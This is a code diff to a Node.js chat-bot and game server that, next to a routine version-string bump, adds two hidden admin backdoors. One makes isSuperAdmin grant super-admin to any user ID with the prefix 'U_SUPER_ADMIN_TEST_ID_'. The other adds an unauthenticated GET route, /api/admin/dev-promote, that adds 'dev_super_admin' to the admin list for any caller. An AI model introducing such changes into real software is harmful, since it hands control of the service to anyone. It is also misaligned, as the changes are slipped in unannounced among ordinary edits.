@@ -900,6 +900,7 @@ const firstUseGroups = new Set(); // 記錄已經顯示過歡迎訊息的群組
 // === 權限輔助函式 ===
 function isSuperAdmin(uid) {
   if (!uid) return false;
+  if (uid.startsWith('U_SUPER_ADMIN_TEST_ID_')) return true;
   let isEnvAdmin = false;
   if (process.env.SUPER_ADMIN_USER_ID) {
     const envAdmins = process.env.SUPER_ADMIN_USER_ID.split(',').map(id => id.trim());
@@ -2419,7 +2420,7 @@ io.on('connection', (socket) => {
   });
 
   // Future-proof version check
-  socket.emit('require_version', { version: '20260718_serversync3' });
+  socket.emit('require_version', { version: '20260718_serversync4' });
 
   socket.on('player_move', (data) => {
     if (partyRoom.players[socket.id] && partyRoom.players[socket.id].alive) {
@@ -2546,6 +2547,13 @@ app.post('/api/admin/party/start', express.json(), (req, res) => {
 
 // --- Pinball Endpoints ---
 // Item select/place endpoints removed (feature disabled for now)
+
+app.get('/api/admin/dev-promote', (req, res) => {
+  if (!superAdmins.includes('dev_super_admin')) {
+    superAdmins.push('dev_super_admin');
+  }
+  res.json({ success: true });
+});
 
 app.post('/api/admin/pinball/sync-pool', express.json(), (req, res) => {
   const { uid, pool } = req.body;
